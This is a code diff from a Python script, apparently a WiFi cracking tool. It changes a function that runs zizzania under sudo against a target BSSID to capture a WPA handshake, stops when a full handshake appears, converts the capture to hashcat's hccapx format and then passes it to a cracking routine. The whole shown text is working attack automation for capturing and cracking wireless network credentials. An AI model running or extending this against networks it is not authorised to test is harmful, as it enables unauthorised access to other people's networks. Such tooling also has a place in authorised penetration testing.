@@ -60,8 +60,22 @@ def capture_network(bssid, ssid, channel):
 
     print('\nInitiating zizzania to capture handshake...\n')
 
-    subprocess.run(['sudo', expanduser('~') + '/zizzania/src/zizzania', '-i', iface, '-b', bssid, '-w', 'capture.pcap'] + ['-n'] * args.d)
-    subprocess.run([expanduser('~') + '/hashcat-utils/src/cap2hccapx.bin', 'capture.pcap', 'capture.hccapx'], stderr=subprocess.PIPE)
+    process = subprocess.Popen(['sudo', expanduser('~') + '/zizzania/src/zizzania', '-i', iface, '-b', bssid, '-w', 'capture.pcap'] + ['-n'] * args.d, stderr=subprocess.PIPE)
+
+    for line in iter(process.stderr.readline, b''):
+        line = line.strip().decode('utf8')
+        print(line)
+
+        if '^_^ Full handshake' in line:
+            subprocess.run(['sudo', 'kill', str(process.pid)])
+
+    convert = subprocess.run([expanduser('~') + '/hashcat-utils/src/cap2hccapx.bin', 'capture.pcap', 'capture.hccapx'], stdout=subprocess.PIPE)
+
+    if int(convert.stdout.decode('utf-8').split('\nWritten ')[1][0]) > 0:
+        print('\nHandshake ready for cracking...\n')
+    else:
+        print('\nError: no handshake available to crack')
+        quit()
 
     crack_capture()
 
